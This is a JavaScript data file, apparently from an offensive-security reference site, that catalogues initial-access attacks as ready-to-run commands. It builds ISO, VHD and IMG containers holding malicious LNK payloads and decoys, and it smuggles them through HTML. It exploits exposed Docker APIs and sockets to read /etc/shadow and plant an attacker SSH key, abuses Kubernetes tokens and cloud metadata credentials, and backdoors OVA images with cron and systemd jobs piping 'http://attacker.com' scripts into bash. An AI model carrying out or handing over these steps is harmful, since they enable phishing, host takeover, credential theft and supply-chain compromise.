export const icContainerTechniques = [
  {
    id: 'ic-container-image-delivery',
    title: 'Container & Disk Image Delivery — ISO, VHD, VHDX, IMG',
    subtitle: 'Deliver payloads inside container formats that Windows auto-mounts, bypassing MOTW and email attachment restrictions',
    tags: ['ISO', 'VHD', 'VHDX', 'IMG', 'container', 'disk image', 'MOTW bypass', 'auto-mount', 'payload delivery'],
    accentColor: 'orange',
    overview: 'Windows 10+ automatically mounts ISO, VHD, VHDX, and IMG files when double-clicked, presenting them as virtual drives. Files inside mounted containers do not inherit the Mark-of-the-Web (MOTW) zone identifier from the outer container on many older Windows configurations. This makes disk image delivery one of the most effective MOTW bypass techniques. The container format is also largely ignored by email gateway scanners that focus on EXE/DLL/script content. Payloads are typically LNK files, script files, or executables hidden inside the mounted volume.',
    steps: [
      'Create a malicious LNK, HTA, or EXE payload for placement inside the container',
      'Build an ISO using mkisofs/oscdimg — set volume label to something convincing',
      'Alternatively: create a VHD (Fixed or Differencing) using diskpart or PowerShell New-VHD',
      'Place the payload file inside with a convincing icon and filename',
      'Optionally include a decoy PDF or document to open simultaneously, giving the user visible content',
      'Deliver via email attachment, SharePoint/OneDrive link, or Teams file share',
      'On open: Windows auto-mounts, Explorer opens the virtual drive, user double-clicks the payload file',
    ],
    commands: [
      {
        title: 'ISO creation — Linux (mkisofs) and Windows (oscdimg)',
        code: `# === Linux: mkisofs / genisoimage ===
mkdir -p payload_iso/
cp malicious_payload.lnk payload_iso/"IT Security Update.lnk"
cp decoy.pdf payload_iso/"Please Read This Document.pdf"

# Create ISO with Joliet long names
mkisofs -o delivery.iso -J -r -V "IT_Security_Update" payload_iso/
# -J  = Joliet extension (Windows long filenames)
# -r  = Rock Ridge (Unix permissions)
# -V  = Volume label

# Verify ISO contents
isoinfo -d -i delivery.iso
isoinfo -l -i delivery.iso

# === Windows: oscdimg (Windows ADK) ===
mkdir C:\\iso_staging
copy malicious_payload.lnk "C:\\iso_staging\\IT Security Update.lnk"
copy decoy.pdf "C:\\iso_staging\\Please Read This Document.pdf"

oscdimg.exe -n -m -o "C:\\iso_staging" "delivery.iso"
# -n = allow long filenames
# -m = ignore maximum image size limit
# -o = optimize storage (remove duplicates)

# === Python: pycdlib ===
pip install pycdlib
python3 -c "
import pycdlib
iso = pycdlib.PyCdlib()
iso.new(joliet=3)
iso.add_file('payload.lnk', joliet_path='/IT Security Update.lnk')
iso.write('delivery.iso')
iso.close()
print('ISO created')
"`
      },
      {
        title: 'VHD / VHDX creation for payload delivery',
        code: `# === PowerShell: Create VHD with payload ===
# Create a fixed-size VHD (1 GB minimum to look legitimate)
$vhdPath = "C:\\Temp\\Q1_Financial_Report.vhd"

# Create VHD using diskpart script
@"
create vdisk file="$vhdPath" maximum=512 type=fixed
attach vdisk
create partition primary
format quick fs=ntfs label="Financial Report"
assign letter=Z
"@ | diskpart

# Copy payload to mounted VHD
Copy-Item "payload.lnk" "Z:\Financial Report Q1 2025.lnk"
Copy-Item "decoy.xlsx" "Z:\Q1_Results.xlsx"

# Detach and deliver
@"
select vdisk file="$vhdPath"
detach vdisk
"@ | diskpart

# === New-VHD (Hyper-V module — cleaner) ===
New-VHD -Path "C:\\Temp\\Report.vhdx" -SizeBytes 512MB -Dynamic
$vhd = Mount-VHD -Path "C:\\Temp\\Report.vhdx" -PassThru
$disk = Get-Disk -Number $vhd.DiskNumber
Initialize-Disk -Number $disk.DiskNumber -PartitionStyle MBR
$partition = New-Partition -DiskNumber $disk.DiskNumber -UseMaximumSize -IsActive
Format-Volume -DriveLetter $partition.DriveLetter -FileSystem NTFS -NewFileSystemLabel "Q1 Report" -Force
Copy-Item "payload.lnk" "$($partition.DriveLetter):\\Q1 Financials.lnk"
Dismount-VHD -Path "C:\\Temp\\Report.vhdx"

# VHD delivery pros:
# - Windows auto-mounts on double-click (no admin needed)
# - Contents appear as a real drive in Explorer
# - Files inside VHD may not inherit MOTW from the outer file`
      },
      {
        title: 'IMG file creation (raw disk image)',
        code: `# IMG files are raw disk images — also auto-mount on Windows
# Create a FAT32 IMG file with malicious payload

# Linux: create IMG
dd if=/dev/zero of=payload.img bs=1M count=50
mkfs.fat -F 32 -n "Updates" payload.img

# Mount and add payload
mkdir -p /tmp/img_mount
mount -o loop payload.img /tmp/img_mount/
cp malicious_payload.lnk "/tmp/img_mount/Security Update.lnk"
cp decoy.pdf "/tmp/img_mount/Read Me.pdf"
umount /tmp/img_mount/
sync

# Verify
file payload.img
# Should show: DOS/MBR boot sector

# Combine container delivery with HTML Smuggling for maximum evasion
# Embed the ISO/VHD as base64 inside HTML — delivered entirely in browser memory
python3 - << 'PYEOF'
import base64, os
with open("delivery.iso", "rb") as f:
    iso_b64 = base64.b64encode(f.read()).decode()
html = f"""<!DOCTYPE html><html><body>
<script>
window.onload = function() {{
  var b64 = "{iso_b64}";
  var raw = atob(b64);
  var bytes = new Uint8Array(raw.length);
  for (var i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
  var blob = new Blob([bytes], {{type:'application/octet-stream'}});
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'IT_Security_Update.iso';
  a.click();
}};
</script></body></html>"""
with open("smuggled.html", "w") as f: f.write(html)
print("Smuggled HTML created — delivers ISO via browser")
PYEOF`
      }
    ]
  },

  {
    id: 'ic-container-docker-escape',
    title: 'Docker & Container Environment Initial Compromise',
    subtitle: 'Exploit exposed Docker APIs, misconfigured containers, and registry credential theft for initial access to containerized environments',
    tags: ['Docker', 'container', 'Docker API', 'registry', 'misconfigured container', 'exposed socket', 'Kubernetes', 'cloud initial access'],
    accentColor: 'orange',
    overview: 'Containerized environments introduce unique initial compromise vectors. An exposed Docker socket or unauthenticated Docker daemon API grants full host access. Misconfigured public container registries expose credentials, proprietary code, and deployment secrets embedded in image layers. Docker images in public registries often contain hardcoded API keys, database passwords, or AWS credentials baked into layers during the build process. CI/CD systems that build Docker images frequently have excessive permissions and are reachable from developer laptops.',
    steps: [
      'Discover exposed Docker daemons: port 2375 (HTTP) or 2376 (TLS) — unauthenticated 2375 is immediate RCE',
      'Enumerate container registries: Docker Hub, ECR, GCR, GHCR — look for public repositories from target org',
      'Pull target org images and extract all layers: search each layer for credentials, keys, config files',
      'Exploit exposed Docker socket: if /var/run/docker.sock is accessible from within a container, escape to host',
      'Enumerate Kubernetes cluster from container: check for service account tokens, environment variables, mounted secrets',
      'Image poisoning: if you can push to the target registry, replace base images with backdoored versions',
    ],
    commands: [
      {
        title: 'Exposed Docker API exploitation',
        code: `# === Discover exposed Docker daemons ===
# Shodan query: port:2375 "Docker" product:"Docker"
# Censys: services.port=2375 AND services.docker.version=*
nmap -p 2375,2376 --open -sV TARGET_NETWORK/24

# Test unauthenticated Docker API (port 2375)
curl http://TARGET:2375/v1.41/containers/json
curl http://TARGET:2375/v1.41/info
curl http://TARGET:2375/v1.41/images/json

# List all containers
docker -H tcp://TARGET:2375 ps -a
docker -H tcp://TARGET:2375 images

# Immediate RCE via Docker API — mount host filesystem
docker -H tcp://TARGET:2375 run -it --rm \\
  -v /:/host \\
  --privileged \\
  alpine chroot /host sh

# Or: create container with full host access
curl -X POST http://TARGET:2375/v1.41/containers/create \\
  -H "Content-Type: application/json" \\
  -d '{
    "Image":"alpine",
    "Cmd":["/bin/sh","-c","chroot /host cat /etc/shadow"],
    "HostConfig":{
      "Binds":["/:/host"],
      "Privileged":true,
      "NetworkMode":"host",
      "PidMode":"host"
    }
  }'

# Extract sensitive data: /etc/shadow, /root/.ssh, /home/*/.*rc`
      },
      {
        title: 'Container registry credential and secret extraction',
        code: `# === Docker registry secret hunting ===
# Pull target org's public Docker images
docker pull targetorg/webapp:latest
docker pull targetorg/api-server:latest

# Dive — inspect each layer for secrets
pip install dive
# Or: docker run --rm -it wagoodman/dive:latest targetorg/webapp:latest

# Manual layer extraction
docker save targetorg/webapp:latest | tar xv -C /tmp/extracted/
# Inspect each layer tarball
for layer in /tmp/extracted/*/layer.tar; do
  echo "=== $layer ==="
  tar -tf "$layer" 2>/dev/null | grep -iE "\.env|config|secret|key|cred|pass|token"
  tar xf "$layer" -O ./app/config.json 2>/dev/null
done

# truffleHog — scan Docker image for secrets
trufflehog docker --image targetorg/webapp:latest
trufflehog docker --image targetorg/webapp:latest --only-verified

# trivy — combined vuln + secret scan
trivy image --security-checks secret targetorg/webapp:latest

# Grep all extracted layers for secrets
find /tmp/extracted -type f | xargs grep -rliE "AWS_|SECRET_KEY|password|token|api_key" 2>/dev/null

# Check for .dockerconfigjson / docker credential helpers
cat ~/.docker/config.json
# Look for base64-encoded credentials in "auth" field
echo "BASE64_VALUE" | base64 -d  # → username:password`
      },
      {
        title: 'Container escape via Docker socket',
        code: `# === If you are INSIDE a container with Docker socket access ===
# Check for mounted socket
ls -la /var/run/docker.sock

# Install Docker client inside container (or use curl)
apt-get install -y docker.io 2>/dev/null || curl -s https://get.docker.com | sh

# Escape: mount host filesystem in new container
docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host

# Escape to host shell
docker run -v /:/mnt/host --rm -it \\
  --security-opt apparmor=unconfined \\
  --cap-add SYS_PTRACE \\
  alpine sh -c "chroot /mnt/host bash"

# Add SSH key to host root
docker run -v /root:/root_host --rm alpine \\
  sh -c "echo 'ssh-rsa AAAA... attacker@host' >> /root_host/.ssh/authorized_keys"

# Via curl (no docker client needed)
curl -s --unix-socket /var/run/docker.sock \\
  -X POST "http://localhost/containers/create" \\
  -H "Content-Type: application/json" \\
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}'`
      },
      {
        title: 'Kubernetes initial access from internet-exposed API',
        code: `# === Kubernetes API server discovery ===
# Default ports: 6443 (HTTPS), 8080 (HTTP - deprecated/dangerous)
nmap -p 6443,8080 --open -sV TARGET_NETWORK/24

# Test anonymous access (misconfigured RBAC)
curl -k https://TARGET:6443/api/v1/namespaces
curl -k https://TARGET:6443/api/v1/secrets
kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify get pods --all-namespaces

# === kubeletctl — exploit exposed kubelet (port 10250) ===
# Kubelet running without auth (--anonymous-auth=true) allows arbitrary pod exec
nmap -p 10250 --open TARGET_NETWORK/24
curl -sk https://TARGET:10250/pods | jq '.items[].metadata.name'
kubeletctl -s TARGET exec -c CONTAINER_NAME -n NAMESPACE -p POD_NAME -- /bin/bash

# === Service account token abuse (from inside a pod) ===
# If running inside a pod with a mounted service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use token to query API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets

# === Extract cloud credentials from IMDS via container ===
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Extract AWS credentials: AccessKeyId, SecretAccessKey, Token`
      }
    ]
  },

  {
    id: 'ic-malicious-vm-image',
    title: 'Malicious Virtual Machine Image Distribution',
    subtitle: 'Distribute backdoored VMware/VirtualBox OVA images via legitimate-looking channels — executes on import',
    tags: ['OVA', 'VMware', 'VirtualBox', 'VM image', 'OVF', 'backdoored VM', 'cloud image', 'AMI', 'backdoor'],
    accentColor: 'orange',
    overview: 'Virtual machine images (OVA, VMDK, VHD, QCOW2) distributed via file sharing, developer forums, or cloud marketplaces often execute scripts during initial boot. A backdoored OVA distributed as a "security research VM", "developer environment", or "Kali-like toolkit" reaches high-value targets who trust and install it. Open Virtualization Archives (OVA/OVF) support customization scripts that run with VM-level privileges on first boot. Cloud marketplace AMIs/Azure images follow the same pattern with cloud-init and user-data scripts.',
    steps: [
      'Obtain a legitimate base VM: Kali, Ubuntu, Windows Server evaluation — users expect these to work normally',
      'Modify the OVF descriptor to include ovf:Environment properties or OVF import hooks',
      'Inject persistence via rc.local, systemd service, crontab, or startup scripts that run on boot',
      'For Windows VMs: modify RunOnce registry key or package as unattend.xml with first-boot commands',
      'Re-package as OVA: tar -cf backdoored.ova manifest.ovf disk.vmdk',
      'Distribute via legitimate-looking channels: GitHub releases, Docker Hub, forums, email, torrent',
      'Payload: reverse shell, beacon, C2 connection, or credential harvesting that fires on VM startup',
    ],
    commands: [
      {
        title: 'OVA backdoor injection',
        code: `# === Inspect and modify an OVA file ===
# OVA is just a TAR file containing OVF descriptor + disk images
tar -tf target.ova
# Typically: manifest.ovf, disk.vmdk (or .vhd), manifest.mf

# Extract OVA
mkdir -p ova_extracted/
tar -xvf target.ova -C ova_extracted/

# === Method 1: Modify OVF to run command on first boot (Linux) ===
# Edit manifest.ovf — add Environment transport
# Add <PropertySection> with startup scripts or modify existing sections

# === Method 2: Mount and modify the VMDK disk ===
# Mount VMDK on Linux
sudo modprobe nbd max_part=16
sudo qemu-nbd -c /dev/nbd0 ova_extracted/disk.vmdk
sudo partprobe /dev/nbd0
sudo mount /dev/nbd0p1 /mnt/vmdk/

# For Linux VM: inject persistence via cron
echo "@reboot root curl -s http://attacker.com/b.sh | bash" >> /mnt/vmdk/etc/crontab
# Or systemd service:
cat > /mnt/vmdk/etc/systemd/system/update-helper.service << 'EOF'
[Unit]
Description=System Update Helper
After=network-online.target
[Service]
ExecStart=/bin/bash -c "curl -s http://attacker.com/beacon.sh | bash"
Restart=always
[Install]
WantedBy=multi-user.target
EOF
ln -sf /etc/systemd/system/update-helper.service \\
  /mnt/vmdk/etc/systemd/system/multi-user.target.wants/update-helper.service

# Unmount
sudo umount /mnt/vmdk/
sudo qemu-nbd -d /dev/nbd0

# === Method 3: For Windows VMDK ===
# Mount Windows partition
sudo mount -o loop,offset=$((PARTITION_OFFSET * 512)) disk.vmdk /mnt/win/

# Add RunOnce entry (will execute on next Windows boot)
# Edit SOFTWARE hive: inject HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
# Use chntpw or hivex to modify registry hives offline
python3 -c "
import hivex
h = hivex.Hivex('/mnt/win/Windows/System32/config/SOFTWARE', write=True)
root = h.root()
# Navigate to RunOnce key and add entry
# ...
h.commit(None)
"

# Repack as OVA
cd ova_extracted/
# Recalculate SHA hash for manifest
sha256sum disk.vmdk | awk '{print \$1}' > manifest.mf
tar -cf ../backdoored.ova manifest.ovf disk.vmdk manifest.mf

# Cloud: build backdoored AMI/Azure image
# AWS: use packer with malicious provisioner
packer build backdoor.pkr.hcl`
      }
    ]
  },
];